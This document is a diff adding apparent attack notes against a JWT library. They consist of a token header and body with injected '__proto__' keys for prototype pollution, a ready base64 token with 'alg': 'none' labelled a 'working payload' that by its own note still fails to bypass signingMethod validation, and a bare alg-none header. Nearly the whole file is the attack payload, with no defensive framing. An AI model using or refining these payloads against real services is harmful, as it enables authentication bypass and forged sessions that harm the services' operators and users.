@@ -1,0 +1,24 @@
+[{
+  "typ": "JWT",
+  "alg": "HS256",
+  "__proto__": {
+    "compact": null,
+    "reservedKeys": ["typ"]
+  }
+},
+{
+  "sub": 1,
+  "scope": "user",
+  "jti": "4cf58968-e553-4ebd-8d52-1407c654e8d6",
+  "iat": 1713925867,
+  "exp": 1713929467,
+  "__proto__": {
+    "compact": null
+  }
+}]
+
+Working payload (still unable to bypass signingMethod validation):
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwiX19wcm90b19fIjp7ImFsZyI6Im5vbmUiLCJjb21wYWN0IjpudWxsLCJyZXNlcnZlZEtleXMiOlsidHlwIl19fQ.eyJzdWIiOjEsInNjb3BlIjoidXNlciIsImp0aSI6IjczODI3NGEyLTA4MzUtNDkzYS05M2E0LTdiODNiZGFiY2UwOCIsImlhdCI6MTcxMzkyNzAyMCwiZXhwIjoxNzEzOTMwNjIwfQ.B14TxDH3inggAaLMV0ddYZmkubHVzRTjbMDrnbRjbGs
+
+
+{"alg": "none","compact": null,"reservedKeys": ["typ"]}
